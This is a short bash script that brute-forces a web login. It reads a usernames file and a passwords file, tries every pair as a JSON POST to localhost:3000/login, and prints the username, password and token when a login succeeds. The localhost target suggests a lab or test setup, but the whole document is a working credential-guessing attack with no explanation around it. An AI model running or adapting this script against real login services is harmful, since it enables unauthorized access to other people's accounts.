#!/bin/bash

USERNAMES_FILE=${1}
PASSWORDS_FILE=${2}

for user in $(cat $USERNAMES_FILE); do
    for pass in $(cat $PASSWORDS_FILE); do
        RESPONSE=$(curl -s -XPOST localhost:3000/login --header 'Content-Type:application/json' -d '{"username": "'$user'","password": "'$pass'"}')

        if [[ $RESPONSE == *"token"* ]]; then
            echo "User:" $user " - Pass:" $pass " - Token: " $RESPONSE
            break;
        fi
    done
done